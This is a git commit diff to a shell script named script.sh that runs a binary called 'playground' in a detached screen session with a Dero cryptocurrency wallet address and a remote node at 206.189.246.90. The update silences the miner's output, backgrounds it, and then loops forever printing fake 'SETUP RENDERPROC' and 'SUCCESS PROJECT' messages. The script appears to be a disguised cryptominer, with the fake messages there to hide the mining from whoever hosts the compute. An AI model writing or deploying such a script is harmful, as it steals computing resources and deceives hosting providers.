f35cddb3a640646fcf995eb49e1db6ba9c3c6386
mayadyu <121432755+mayadyu@users.noreply.github.com>
2023-01-05 22:05:42 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
-screen -dmS run chmod 500 playground && ./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r 206.189.246.90:10100 -p rpc
-lscpu
-ping google.com -c 10000000 
-
+screen -dmS run chmod 500 playground && ./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r 206.189.246.90:10100 -p rpc > /dev/null 2>&1 &
+sleep 3600
+while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 10;let "i++";  done
 
 
 
